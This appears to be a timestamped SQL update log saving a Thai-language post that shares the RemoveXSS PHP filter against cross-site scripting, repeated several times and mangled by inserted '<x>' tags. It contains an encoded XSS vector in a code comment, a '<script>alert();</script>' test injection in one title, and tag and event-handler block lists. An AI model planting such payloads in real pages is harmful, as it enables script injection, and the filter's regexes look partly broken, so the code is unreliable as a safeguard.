+&nbsp;&nbsp; // note that you have to handle splits with \\n \\r and \\t later since they *are* allowed in some inputs<br />
+&nbsp;&nbsp; $val = preg_replace(\'/([\\x00-\\x08\\x0b-\\x0c\\x0e-\\x19])/\' \'\' $val);<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp; // straight replacements the user should never need these since they\'re normal characters<br />
+&nbsp;&nbsp; // this prevents like &lt;IMG SRC=&amp;#X40&amp;#X61&amp;#X76&amp;#X61&amp;#X73&amp;#X63&amp;#X72&amp;#X69&amp;#X70&amp;#X74&amp;#X3A &amp;#X61&amp;#X6C&amp;#X65&amp;#X72&amp;#X74&amp;#X28&amp;#X27&amp;#X58&amp;#X53&amp;#X53&amp;#X27&amp;#X29&gt;<br />
+&nbsp;&nbsp; $search = \'abcdefghijklmnopqrstuvwxyz\';<br />
+&nbsp;&nbsp; $search .= \'ABCDEFGHIJKLMNOPQRSTUVWXYZ\';<br />
+&nbsp;&nbsp; $search .= \'1234567890!@#$%^&amp;*()\';<br />
+&nbsp;&nbsp; $search .= \'~`&quot;;:?+/={}[]-_|\\\'\\\\\';<br />
+&nbsp;&nbsp; for ($i = 0; $i &lt; strlen($search); $i++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // ;? matches the ; which is optional<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // 0{07} matches any padded zeros which are optional and go up to 8 chars<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // &amp;#x0040 @ search for the hex values<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val = preg_replace(\'/(&amp;#[xX]0{08}\'.dechex(ord($search[$i])).\';?)/i\' $search[$i] $val); // with a ;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // &amp;#00064 @ 0{07} matches \'0\' zero to seven times<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val = preg_replace(\'/(&amp;#0{08}\'.ord($search[$i]).\';?)/\' $search[$i] $val); // with a ;<br />
+&nbsp;&nbsp; }<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp; // now the only remaining whitespace attacks are \\t \\n and \\r<br />
+&nbsp;&nbsp; $ra1 = Array(\'ja<x>vasc<x>ript\' \'vb<x>sc<x>ript\' \'ex<x>pression\' \'ap<x>plet\' \'me<x>ta\' \'xm<x>l\' \'bl<x>ink\' \'li<x>nk\' \'st<x>yle\' \'sc<x>ript\' \'em<x>bed\' \'ob<x>ject\' \'if<x>rame\' \'fr<x>ame\' \'fr<x>ameset\' \'il<x>ayer\' \'la<x>yer\' \'bg<x>sound\' \'ti<x>tle\' \'ba<x>se\');<br />
+&nbsp;&nbsp; $ra2 = Array(\'on<x>abort\' \'on<x>activate\' \'on<x>afterprint\' \'on<x>afterupdate\' \'on<x>beforeactivate\' \'on<x>beforecopy\' \'on<x>beforecut\' \'on<x>beforedeactivate\' \'on<x>beforeeditfocus\' \'on<x>beforepaste\' \'on<x>beforeprint\' \'on<x>beforeunload\' \'on<x>beforeupdate\' \'on<x>blur\' \'on<x>bounce\' \'on<x>cellchange\' \'on<x>change\' \'on<x>click\' \'on<x>contextmenu\' \'on<x>controlselect\' \'on<x>copy\' \'on<x>cut\' \'on<x>dataavailable\' \'on<x>datasetchanged\' \'on<x>datasetcomplete\' \'on<x>dblclick\' \'on<x>deactivate\' \'on<x>drag\' \'on<x>dragend\' \'on<x>dragenter\' \'on<x>dragleave\' \'on<x>dragover\' \'on<x>dragstart\' \'on<x>drop\' \'on<x>error\' \'on<x>errorupdate\' \'on<x>filterchange\' \'on<x>finish\' \'on<x>focus\' \'on<x>focusin\' \'on<x>focusout\' \'on<x>help\' \'on<x>keydown\' \'on<x>keypress\' \'on<x>keyup\' \'on<x>layoutcomplete\' \'on<x>load\' \'on<x>losecapture\' \'on<x>mousedown\' \'on<x>mouseenter\' \'on<x>mouseleave\' \'on<x>mousemove\' \'on<x>mouseout\' \'on<x>mouseover\' \'on<x>mouseup\' \'on<x>mousewheel\' \'on<x>move\' \'on<x>moveend\' \'on<x>movestart\' \'on<x>paste\' \'on<x>propertychange\' \'on<x>readystatechange\' \'on<x>reset\' \'on<x>resize\' \'on<x>resizeend\' \'on<x>resizestart\' \'on<x>rowenter\' \'on<x>rowexit\' \'on<x>rowsdelete\' \'on<x>rowsinserted\' \'on<x>scroll\' \'on<x>select\' \'on<x>selection<x>change\' \'on<x>selectstart\' \'on<x>start\' \'on<x>stop\' \'on<x>submit\' \'on<x>unload\');<br />
+&nbsp;&nbsp; $ra = array_merge($ra1 $ra2);<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp; $found = true; // keep replacing as long as the previous round replaced something<br />
+&nbsp;&nbsp; while ($found == true) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val_before = $val;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for ($i = 0; $i &lt; sizeof($ra); $i++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern = \'/\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for ($j = 0; $j &lt; strlen($ra[$i]); $j++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($j &gt; 0) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'(\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'(&amp;#[xX]0{08}([9ab]);)\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'|\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'|(&amp;#0{08}([9|10|13]);)\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \')*\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= $ra[$i][$j];<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'/i\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $replacement = substr($ra[$i] 0 2).\'&lt;x&gt;\'.substr($ra[$i] 2); // add in &lt;&gt; to nerf the tag<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val = preg_replace($pattern $replacement $val); // filter out the hex tags<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($val_before == $val) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // no replacements were made so exit the loop<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $found = false;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp; }<br />
+&nbsp;&nbsp; return $val;<br />
+} <br />
+&nbsp;</x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></p>
+<p><u><b>ที่มา </b></u>http://kallahar.com/smallprojects/php_xss_filter_function.php</p>' Where content_id = 25 
+16:03:45 :  => Update content SET category_id='1',content_name='มาป้องกัน Cross-Site scripting อันร้ายกาจกันครับ',content_summary='<p>มาป้องกัน Cross-Site sc<x>ripting อันร้ายกาจกันครับ<br />
+พอดีไปเจอมาช่วยได้เยอะครับ แต่ไม่แน่ใจว่าครอบคลุมหรือเปล่า<br />
+ตอนแรกผมก็โดน SQL Injection ด้วยและก็มี sc<x>ript บางตัวหลุด<br />
+อย่างที่ไม่คาดคิดว่ามันจะร้ายกาจได้ขนาดนี้ ต้องขอบคุณ พี่ด้า Inpross มากนะครับ<br />
+ที่อุตส่าห์นั่งหาสาเหตุกันตั้งนานสองนาน</x></x></p>
+<p><x><x>&lt;script sfsdf</x></x></p>',content_detail='<p><b>เอาไปเลยครับ sc<x>ript </x></b></p>
+<p>function RemoveXSS($val) {<br />
+&nbsp;&nbsp; // remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed<br />
+&nbsp;&nbsp; // this prevents some character re-spacing such as &lt;java\\0sc<x>ript&gt;<br />
+&nbsp;&nbsp; // note that you have to handle splits with \\n \\r and \\t later since they *are* allowed in some inputs<br />
+&nbsp;&nbsp; $val = preg_replace(\'/([\\x00-\\x08\\x0b-\\x0c\\x0e-\\x19])/\' \'\' $val);<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp; // straight replacements the user should never need these since they\'re normal characters<br />
+&nbsp;&nbsp; // this prevents like &lt;IMG SRC=&amp;#X40&amp;#X61&amp;#X76&amp;#X61&amp;#X73&amp;#X63&amp;#X72&amp;#X69&amp;#X70&amp;#X74&amp;#X3A &amp;#X61&amp;#X6C&amp;#X65&amp;#X72&amp;#X74&amp;#X28&amp;#X27&amp;#X58&amp;#X53&amp;#X53&amp;#X27&amp;#X29&gt;<br />
+&nbsp;&nbsp; $search = \'abcdefghijklmnopqrstuvwxyz\';<br />
+&nbsp;&nbsp; $search .= \'ABCDEFGHIJKLMNOPQRSTUVWXYZ\';<br />
+&nbsp;&nbsp; $search .= \'1234567890!@#$%^&amp;*()\';<br />
+&nbsp;&nbsp; $search .= \'~`&quot;;:?+/={}[]-_|\\\'\\\\\';<br />
+&nbsp;&nbsp; for ($i = 0; $i &lt; strlen($search); $i++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // ;? matches the ; which is optional<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // 0{07} matches any padded zeros which are optional and go up to 8 chars<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // &amp;#x0040 @ search for the hex values<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val = preg_replace(\'/(&amp;#[xX]0{08}\'.dechex(ord($search[$i])).\';?)/i\' $search[$i] $val); // with a ;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // &amp;#00064 @ 0{07} matches \'0\' zero to seven times<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val = preg_replace(\'/(&amp;#0{08}\'.ord($search[$i]).\';?)/\' $search[$i] $val); // with a ;<br />
+&nbsp;&nbsp; }<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp; // now the only remaining whitespace attacks are \\t \\n and \\r<br />
+&nbsp;&nbsp; $ra1 = Array(\'ja<x>vasc<x>ript\' \'vb<x>sc<x>ript\' \'ex<x>pression\' \'ap<x>plet\' \'me<x>ta\' \'xm<x>l\' \'bl<x>ink\' \'li<x>nk\' \'st<x>yle\' \'sc<x>ript\' \'em<x>bed\' \'ob<x>ject\' \'if<x>rame\' \'fr<x>ame\' \'fr<x>ameset\' \'il<x>ayer\' \'la<x>yer\' \'bg<x>sound\' \'ti<x>tle\' \'ba<x>se\');<br />
+&nbsp;&nbsp; $ra2 = Array(\'on<x>abort\' \'on<x>activate\' \'on<x>afterprint\' \'on<x>afterupdate\' \'on<x>beforeactivate\' \'on<x>beforecopy\' \'on<x>beforecut\' \'on<x>beforedeactivate\' \'on<x>beforeeditfocus\' \'on<x>beforepaste\' \'on<x>beforeprint\' \'on<x>beforeunload\' \'on<x>beforeupdate\' \'on<x>blur\' \'on<x>bounce\' \'on<x>cellchange\' \'on<x>change\' \'on<x>click\' \'on<x>contextmenu\' \'on<x>controlselect\' \'on<x>copy\' \'on<x>cut\' \'on<x>dataavailable\' \'on<x>datasetchanged\' \'on<x>datasetcomplete\' \'on<x>dblclick\' \'on<x>deactivate\' \'on<x>drag\' \'on<x>dragend\' \'on<x>dragenter\' \'on<x>dragleave\' \'on<x>dragover\' \'on<x>dragstart\' \'on<x>drop\' \'on<x>error\' \'on<x>errorupdate\' \'on<x>filterchange\' \'on<x>finish\' \'on<x>focus\' \'on<x>focusin\' \'on<x>focusout\' \'on<x>help\' \'on<x>keydown\' \'on<x>keypress\' \'on<x>keyup\' \'on<x>layoutcomplete\' \'on<x>load\' \'on<x>losecapture\' \'on<x>mousedown\' \'on<x>mouseenter\' \'on<x>mouseleave\' \'on<x>mousemove\' \'on<x>mouseout\' \'on<x>mouseover\' \'on<x>mouseup\' \'on<x>mousewheel\' \'on<x>move\' \'on<x>moveend\' \'on<x>movestart\' \'on<x>paste\' \'on<x>propertychange\' \'on<x>readystatechange\' \'on<x>reset\' \'on<x>resize\' \'on<x>resizeend\' \'on<x>resizestart\' \'on<x>rowenter\' \'on<x>rowexit\' \'on<x>rowsdelete\' \'on<x>rowsinserted\' \'on<x>scroll\' \'on<x>select\' \'on<x>selection<x>change\' \'on<x>selectstart\' \'on<x>start\' \'on<x>stop\' \'on<x>submit\' \'on<x>unload\');<br />
+&nbsp;&nbsp; $ra = array_merge($ra1 $ra2);<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp; $found = true; // keep replacing as long as the previous round replaced something<br />
+&nbsp;&nbsp; while ($found == true) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val_before = $val;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for ($i = 0; $i &lt; sizeof($ra); $i++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern = \'/\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for ($j = 0; $j &lt; strlen($ra[$i]); $j++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($j &gt; 0) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'(\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'(&amp;#[xX]0{08}([9ab]);)\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'|\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'|(&amp;#0{08}([9|10|13]);)\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \')*\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= $ra[$i][$j];<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'/i\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $replacement = substr($ra[$i] 0 2).\'&lt;x&gt;\'.substr($ra[$i] 2); // add in &lt;&gt; to nerf the tag<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val = preg_replace($pattern $replacement $val); // filter out the hex tags<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($val_before == $val) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // no replacements were made so exit the loop<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $found = false;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp; }<br />
+&nbsp;&nbsp; return $val;<br />
+} <br />
+&nbsp;</x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></p>
+<p><u><b>ที่มา </b></u>http://kallahar.com/smallprojects/php_xss_filter_function.php</p>' Where content_id = 25 
+16:03:56 :  => Update content SET category_id='1',content_name='มาป้องกัน Cross-Site scripting อันร้ายกาจกันครับ',content_summary='<p>มาป้องกัน Cross-Site sc<x>ripting อันร้ายกาจกันครับ<br />
+พอดีไปเจอมาช่วยได้เยอะครับ แต่ไม่แน่ใจว่าครอบคลุมหรือเปล่า<br />
+ตอนแรกผมก็โดน SQL Injection ด้วยและก็มี sc<x>ript บางตัวหลุด<br />
+อย่างที่ไม่คาดคิดว่ามันจะร้ายกาจได้ขนาดนี้ ต้องขอบคุณ พี่ด้า Inpross มากนะครับ<br />
+ที่อุตส่าห์นั่งหาสาเหตุกันตั้งนานสองนาน</x></x></p>
+<p><x><x><br />
+</x></x></p>',content_detail='<p><b>เอาไปเลยครับ sc<x>ript </x></b></p>
+<p>function RemoveXSS($val) {<br />
+&nbsp;&nbsp; // remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed<br />
+&nbsp;&nbsp; // this prevents some character re-spacing such as &lt;java\\0sc<x>ript&gt;<br />
+&nbsp;&nbsp; // note that you have to handle splits with \\n \\r and \\t later since they *are* allowed in some inputs<br />
+&nbsp;&nbsp; $val = preg_replace(\'/([\\x00-\\x08\\x0b-\\x0c\\x0e-\\x19])/\' \'\' $val);<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp; // straight replacements the user should never need these since they\'re normal characters<br />
+&nbsp;&nbsp; // this prevents like &lt;IMG SRC=&amp;#X40&amp;#X61&amp;#X76&amp;#X61&amp;#X73&amp;#X63&amp;#X72&amp;#X69&amp;#X70&amp;#X74&amp;#X3A &amp;#X61&amp;#X6C&amp;#X65&amp;#X72&amp;#X74&amp;#X28&amp;#X27&amp;#X58&amp;#X53&amp;#X53&amp;#X27&amp;#X29&gt;<br />
+&nbsp;&nbsp; $search = \'abcdefghijklmnopqrstuvwxyz\';<br />
+&nbsp;&nbsp; $search .= \'ABCDEFGHIJKLMNOPQRSTUVWXYZ\';<br />
+&nbsp;&nbsp; $search .= \'1234567890!@#$%^&amp;*()\';<br />
+&nbsp;&nbsp; $search .= \'~`&quot;;:?+/={}[]-_|\\\'\\\\\';<br />
+&nbsp;&nbsp; for ($i = 0; $i &lt; strlen($search); $i++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // ;? matches the ; which is optional<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // 0{07} matches any padded zeros which are optional and go up to 8 chars<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // &amp;#x0040 @ search for the hex values<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val = preg_replace(\'/(&amp;#[xX]0{08}\'.dechex(ord($search[$i])).\';?)/i\' $search[$i] $val); // with a ;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // &amp;#00064 @ 0{07} matches \'0\' zero to seven times<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val = preg_replace(\'/(&amp;#0{08}\'.ord($search[$i]).\';?)/\' $search[$i] $val); // with a ;<br />
+&nbsp;&nbsp; }<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp; // now the only remaining whitespace attacks are \\t \\n and \\r<br />
+&nbsp;&nbsp; $ra1 = Array(\'ja<x>vasc<x>ript\' \'vb<x>sc<x>ript\' \'ex<x>pression\' \'ap<x>plet\' \'me<x>ta\' \'xm<x>l\' \'bl<x>ink\' \'li<x>nk\' \'st<x>yle\' \'sc<x>ript\' \'em<x>bed\' \'ob<x>ject\' \'if<x>rame\' \'fr<x>ame\' \'fr<x>ameset\' \'il<x>ayer\' \'la<x>yer\' \'bg<x>sound\' \'ti<x>tle\' \'ba<x>se\');<br />
+&nbsp;&nbsp; $ra2 = Array(\'on<x>abort\' \'on<x>activate\' \'on<x>afterprint\' \'on<x>afterupdate\' \'on<x>beforeactivate\' \'on<x>beforecopy\' \'on<x>beforecut\' \'on<x>beforedeactivate\' \'on<x>beforeeditfocus\' \'on<x>beforepaste\' \'on<x>beforeprint\' \'on<x>beforeunload\' \'on<x>beforeupdate\' \'on<x>blur\' \'on<x>bounce\' \'on<x>cellchange\' \'on<x>change\' \'on<x>click\' \'on<x>contextmenu\' \'on<x>controlselect\' \'on<x>copy\' \'on<x>cut\' \'on<x>dataavailable\' \'on<x>datasetchanged\' \'on<x>datasetcomplete\' \'on<x>dblclick\' \'on<x>deactivate\' \'on<x>drag\' \'on<x>dragend\' \'on<x>dragenter\' \'on<x>dragleave\' \'on<x>dragover\' \'on<x>dragstart\' \'on<x>drop\' \'on<x>error\' \'on<x>errorupdate\' \'on<x>filterchange\' \'on<x>finish\' \'on<x>focus\' \'on<x>focusin\' \'on<x>focusout\' \'on<x>help\' \'on<x>keydown\' \'on<x>keypress\' \'on<x>keyup\' \'on<x>layoutcomplete\' \'on<x>load\' \'on<x>losecapture\' \'on<x>mousedown\' \'on<x>mouseenter\' \'on<x>mouseleave\' \'on<x>mousemove\' \'on<x>mouseout\' \'on<x>mouseover\' \'on<x>mouseup\' \'on<x>mousewheel\' \'on<x>move\' \'on<x>moveend\' \'on<x>movestart\' \'on<x>paste\' \'on<x>propertychange\' \'on<x>readystatechange\' \'on<x>reset\' \'on<x>resize\' \'on<x>resizeend\' \'on<x>resizestart\' \'on<x>rowenter\' \'on<x>rowexit\' \'on<x>rowsdelete\' \'on<x>rowsinserted\' \'on<x>scroll\' \'on<x>select\' \'on<x>selection<x>change\' \'on<x>selectstart\' \'on<x>start\' \'on<x>stop\' \'on<x>submit\' \'on<x>unload\');<br />
+&nbsp;&nbsp; $ra = array_merge($ra1 $ra2);<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp; $found = true; // keep replacing as long as the previous round replaced something<br />
+&nbsp;&nbsp; while ($found == true) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val_before = $val;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for ($i = 0; $i &lt; sizeof($ra); $i++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern = \'/\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for ($j = 0; $j &lt; strlen($ra[$i]); $j++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($j &gt; 0) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'(\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'(&amp;#[xX]0{08}([9ab]);)\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'|\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'|(&amp;#0{08}([9|10|13]);)\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \')*\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= $ra[$i][$j];<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'/i\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $replacement = substr($ra[$i] 0 2).\'&lt;x&gt;\'.substr($ra[$i] 2); // add in &lt;&gt; to nerf the tag<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val = preg_replace($pattern $replacement $val); // filter out the hex tags<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($val_before == $val) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // no replacements were made so exit the loop<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $found = false;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp; }<br />
+&nbsp;&nbsp; return $val;<br />
+} <br />
+&nbsp;</x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></p>
+<p><u><b>ที่มา </b></u>http://kallahar.com/smallprojects/php_xss_filter_function.php</p>' Where content_id = 25 
+16:03:27 :  => Update content SET category_id='1',content_name='มาป้องกัน Cross-Site scripting อันร้ายกาจกันครับ <script>alert();</script>',content_summary='<p>มาป้องกัน Cross-Site sc<x>ripting อันร้ายกาจกันครับ<br />
+พอดีไปเจอมาช่วยได้เยอะครับ แต่ไม่แน่ใจว่าครอบคลุมหรือเปล่า<br />
+ตอนแรกผมก็โดน SQL Injection ด้วยและก็มี sc<x>ript บางตัวหลุด<br />
+อย่างที่ไม่คาดคิดว่ามันจะร้ายกาจได้ขนาดนี้ ต้องขอบคุณ พี่ด้า Inpross มากนะครับ<br />
+ที่อุตส่าห์นั่งหาสาเหตุกันตั้งนานสองนาน</x></x></p>
+<p><x><x><br />
+</x></x></p>',content_detail='<p><b>เอาไปเลยครับ sc<x>ript </x></b></p>
+<p>function RemoveXSS($val) {<br />
+&nbsp;&nbsp; // remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed<br />
+&nbsp;&nbsp; // this prevents some character re-spacing such as &lt;java\\0sc<x>ript&gt;<br />
+&nbsp;&nbsp; // note that you have to handle splits with \\n \\r and \\t later since they *are* allowed in some inputs<br />
+&nbsp;&nbsp; $val = preg_replace(\'/([\\x00-\\x08\\x0b-\\x0c\\x0e-\\x19])/\' \'\' $val);<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp; // straight replacements the user should never need these since they\'re normal characters<br />
